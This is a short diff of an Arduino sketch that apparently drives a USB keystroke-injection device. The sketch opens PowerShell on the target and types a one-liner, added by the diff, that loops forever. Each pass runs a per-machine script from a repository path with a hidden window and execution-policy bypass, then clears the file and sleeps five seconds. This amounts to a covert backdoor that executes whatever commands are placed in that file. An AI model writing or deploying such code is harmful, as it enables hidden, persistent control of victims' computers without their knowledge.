@@ -23,9 +23,8 @@ void setup()
   show_desktop();
   delay(200);
   posh();
+  println("$repoLocation='\\path\to\repository';$machine=hostname;$full=$repoLocation+'\'+$machine+'.ps1';if((test-path $full) -eq $False){echo ''>$full}do{powershell -windowstyle hidden -executionpolicy bypass $full;echo ''>$full;start-sleep -s 5;}while(1)");
 
-  delay(500);
-  Keyboard.println("$machine=hostname");
 }
 
 void loop(){
